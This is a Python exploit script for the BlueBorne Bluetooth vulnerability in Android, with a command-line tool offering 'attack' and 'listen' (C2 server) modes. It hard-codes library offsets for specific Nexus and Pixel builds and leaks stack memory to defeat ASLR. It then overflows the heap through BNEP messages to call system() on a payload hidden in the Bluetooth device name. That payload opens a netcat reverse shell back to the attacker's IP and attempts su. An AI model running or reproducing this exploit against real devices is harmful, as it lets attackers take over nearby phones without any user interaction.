import argparse
import binascii
import os
import select
import struct
import sys
import time

import bluetooth
from bluetooth import _bluetooth as bt
from pwn import log

import bluedroid
import connectback

# Listening TCP ports that need to be opened on the attacker machine
NC_PORT = 1233
STDOUT_PORT = 1234
STDIN_PORT = 1235


# Exploit offsets work for these (exact) libs:

# bullhead:/ # sha1sum /system/lib/hw/bluetooth.default.so
# 8a89cadfe96c0f79cdceee26c29aaf23e3d07a26  /system/lib/hw/bluetooth.default.so
# bullhead:/ # sha1sum /system/lib/libc.so
# 0b5396cd15a60b4076dacced9df773f75482f537  /system/lib/libc.so

# For Pixel 7.1.2 patch level Aug/July 2017
#LIBC_TEXT_STSTEM_OFFSET = 0x45f80 + 1 - 56 # system + 1
#LIBC_SOME_BLX_OFFSET = 0x1a420 + 1 - 608 # eventfd_write + 28 + 1

LIBC_TEXT_STSTEM_OFFSET = 0x418c1 # system + 1
LIBC_SOME_BLX_OFFSET = 0x4f30b # eventfd_write + 28 + 1

# Nexus 5 6.0.1
#LIBC_TEXT_STSTEM_OFFSET = 0x3ea04 + 1 # system + 1
#LIBC_SOME_BLX_OFFSET = 0x5825b

# For Nexus 5X 7.1.2 patch level Aug/July 2017
#LIBC_TEXT_STSTEM_OFFSET = 0x45f80 + 1
#LIBC_SOME_BLX_OFFSET = 0x1a420 + 1


# Aligned to 4 inside the name on the bss (same for both supported phones)
#BSS_ACL_REMOTE_NAME_OFFSET = 0x202ee4
BLUETOOTH_BSS_SOME_VAR_OFFSET = 0xd4b68
#BLUETOOTH_BSS_SOME_VAR_OFFSET = 0x14b244

# Nexus 5 6.0.1
BSS_ACL_REMOTE_NAME_OFFSET = 0xC65FC
#BLUETOOTH_BSS_SOME_VAR_OFFSET = 0x144d80

MAX_BT_NAME = 0xf5

# Payload details (attacker IP should be accessible over the internet for the victim phone)
SHELL_SCRIPT = b'toybox nc {ip} {port} | sh && su' ; 'id' ; 'su' 


PWNING_TIMEOUT = 10
BNEP_PSM = 15
PWN_ATTEMPTS = 10
LEAK_ATTEMPTS = 1


def set_bt_name(payload, src_hci, src, dst):
    # Create raw HCI sock to set our BT name
    raw_sock = bt.hci_open_dev(bt.hci_devid(src_hci))
    flt = bt.hci_filter_new()
    bt.hci_filter_all_ptypes(flt)
    bt.hci_filter_all_events(flt)
    raw_sock.setsockopt(bt.SOL_HCI, bt.HCI_FILTER, flt)

    # Send raw HCI command to our controller to change the BT name (first 3 bytes are padding for alignment)
    raw_sock.sendall(binascii.unhexlify('01130cf8cccccc') + payload.ljust(MAX_BT_NAME, b'\x00'))
    raw_sock.close()
    #time.sleep(1)
    time.sleep(0.1)

    # Connect to BNEP to "refresh" the name (does auth)
    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bnep.bind((src, 0))
    bnep.connect((dst, BNEP_PSM))
    bnep.close()

    # Close ACL connection
    os.system('hcitool dc %s' % (dst,))
    #time.sleep(1)


def set_rand_bdaddr(src_hci):
    addr = ['%02x' % (ord(c),) for c in os.urandom(6)]
    # NOTW: works only with CSR bluetooth adapters!
    os.system('sudo bccmd -d %s psset -r bdaddr 0x%s 0x00 0x%s 0x%s 0x%s 0x00 0x%s 0x%s' %
              (src_hci, addr[3], addr[5], addr[4], addr[2], addr[1], addr[0]))
    final_addr = ':'.join(addr)
    log.info('Set %s to new rand BDADDR %s' % (src_hci, final_addr))
    #time.sleep(1)
    time.sleep(5)
    os.system('sudo hciconfig %s up' %src_hci)
    while bt.hci_devid(final_addr) < 0:
        time.sleep(0.1)
    return final_addr


def memory_leak_get_bases(src, src_hci, dst):
    prog = log.progress('Doing stack memory leak...')

    # Get leaked stack data. This memory leak gets "deterministic" "garbage" from the stack.
    result = bluedroid.do_sdp_info_leak(dst, src)

    # Calculate according to known libc.so and bluetooth.default.so binaries
    likely_some_libc_blx_offset = result[14][2]
    likely_some_bluetooth_default_global_var_offset = result[13][4]

    counter1 = 0
    counter2 = 0
    for lines in result:
        counter1 += 1
        for line in lines:
            counter2 += 1
            print("Position: [%d:%d], Value: %s" %(counter1, counter2,hex(line)))
            print("Libc_text_base: 0x%08x" %(line - LIBC_SOME_BLX_OFFSET))
        counter2 = 0


    libc_text_base = likely_some_libc_blx_offset - LIBC_SOME_BLX_OFFSET
    bluetooth_default_bss_base = likely_some_bluetooth_default_global_var_offset - BLUETOOTH_BSS_SOME_VAR_OFFSET

    log.info('libc_base: 0x%08x, bss_base: 0x%08x' % (libc_text_base, bluetooth_default_bss_base))

    # Close SDP ACL connection
    os.system('hcitool dc %s' % (dst,))
    time.sleep(0.1)

    prog.success()
    return libc_text_base, bluetooth_default_bss_base


def pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my_ip, libc_text_base):
    # Gen new BDADDR, so that the new BT name will be cached
    src = set_rand_bdaddr(src_hci)

    # Payload is: '"\x17AAAAAAsysm";\n<bash_commands>\n#'
    # 'sysm' is the address of system() from libc. The *whole* payload is a shell script.
    # 0x1700 == (0x1722 & 0xff00) is the "event" of a "HORRIBLE_HACK" message.
    payload = struct.pack('<III', 0xAAAA1722, 0x41414141, system_addr) + b'";\n' + \
                          SHELL_SCRIPT.format(ip=my_ip, port=NC_PORT) + b'\n#'

    assert len(payload) < MAX_BT_NAME
    assert b'\x00' not in payload

    # Puts payload into a known bss location (once we create a BNEP connection).
    set_bt_name(payload, src_hci, src, dst)

    prog = log.progress('Connecting to BNEP again')

    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bnep.bind((src, 0))
    bnep.connect((dst, BNEP_PSM))

    prog.success()
    prog = log.progress('Pwning...')

    # Each of these messages causes BNEP code to send 100 "command not understood" responses.
    # This causes list_node_t allocations on the heap (one per reponse) as items in the xmit_hold_q.
    # These items are popped asynchronously to the arrival of our incoming messages (into hci_msg_q).
    # Thus "holes" are created on the heap, allowing us to overflow a yet unhandled list_node of hci_msg_q.
    for i in range(20):
        bnep.send(binascii.unhexlify('8109' + '800109' * 100))

    # Repeatedly trigger the vuln (overflow of 8 bytes) after an 8 byte size heap buffer.
    # This is highly likely to fully overflow over instances of "list_node_t" which is exactly
    # 8 bytes long (and is *constantly* used/allocated/freed on the heap).
    # Eventually one overflow causes a call to happen to "btu_hci_msg_process" with "p_msg"
    # under our control. ("btu_hci_msg_process" is called *constantly* with messages out of a list)
    for i in range(1000):
        # If we're blocking here, the daemon has crashed
        _, writeable, _ = select.select([], [bnep], [], PWNING_TIMEOUT)
        if not writeable:
            break
        bnep.send(binascii.unhexlify('810100') +
                  struct.pack('<II', 0, acl_name_addr))
    else:
        log.info("Looks like it didn't crash. Possibly worked")

    prog.success()

def attack(args):
    src_hci, target_mac, cc_ip = args.SRC_HCI, args.TARGET_MAC, args.C2_IP
    log.info('attacking')
    log.info('Target MAC: {}'.format(target_mac))
    log.info('C2 IP: {}'.format(cc_ip))

    os.system('hciconfig %s sspmode 0' % (src_hci,))
    os.system('hcitool dc %s' % (target_mac,))

    sh_s, stdin, stdout = connectback.create_sockets(NC_PORT, STDIN_PORT, STDOUT_PORT)

    for i in range(PWN_ATTEMPTS):
        log.info('Pwn attempt %d:' % (i,))

        # Create a new BDADDR
        src = set_rand_bdaddr(src_hci)

        # Try to leak section bases
        for j in range(LEAK_ATTEMPTS):
            libc_text_base, bluetooth_default_bss_base = memory_leak_get_bases(src, src_hci, target_mac)
            if (libc_text_base & 0xfff == 0) and (bluetooth_default_bss_base & 0xfff == 0):
                break
        else:
            log.error("FAILED: Memory doesn't seem to have leaked as expected. Wrong .so versions?")
            return 1

        system_addr = LIBC_TEXT_STSTEM_OFFSET + libc_text_base
        acl_name_addr = BSS_ACL_REMOTE_NAME_OFFSET + bluetooth_default_bss_base
        assert acl_name_addr % 4 == 0
        log.info('system: 0x%08x, acl_name: 0x%08x' % (system_addr, acl_name_addr))

        pwn(src_hci, target_mac, bluetooth_default_bss_base, system_addr, acl_name_addr, cc_ip, libc_text_base)
        # Check if we got a connectback
        readable, _, _ = select.select([sh_s], [], [], PWNING_TIMEOUT)
        if readable:
            log.info('Pwning successful')
            break

    else:
        log.error("Pwning failed all attempts")
        sys.exit(1)


def listen(args):
    cc_ip = args.C2_IP
    log.info('listening from: {}'.format(cc_ip))

    sh_s, stdin, stdout = connectback.create_sockets(NC_PORT, STDIN_PORT, STDOUT_PORT)

    connectback.interactive_shell(sh_s, stdin, stdout, cc_ip, STDIN_PORT, STDOUT_PORT)


if __name__ == '__main__':
    """
    Ex: python2 doit-Ace3.py hci0 <MAC-BLUETOOTH-TARGET> <IP-Connect>d .
    
    """
    parser = argparse.ArgumentParser()
    sub_parsers = parser.add_subparsers(title='BlueBorne')

    parser_attack = sub_parsers.add_parser('attack', help='attack a given target')
    parser_attack.add_argument('SRC_HCI', action='store', help='source HCI')
    parser_attack.add_argument('TARGET_MAC', action='store', help='bluetooh MAC address of target')
    parser_attack.add_argument('C2_IP', action='store', help='IP of the C2 server')
    parser_attack.set_defaults(func=attack)

    parser_listen = sub_parsers.add_parser('listen', help='act as a C2 server')
    parser_listen.add_argument('C2_IP', action='store', help='IP of the C2 server')
    parser_listen.set_defaults(func=listen)
    args = parser.parse_args()
    args.func(args)

    # actions = parser.add_mutually_exclusive_group()
    # actions.add_argument('listen', help='start the listener')
    # actions.add_argument('attack', help='attack a given target')
    # parser.add_subparsers()
    # parser.add_argument("listen")
    # sys.exit(main(*sys.argv[1:]))
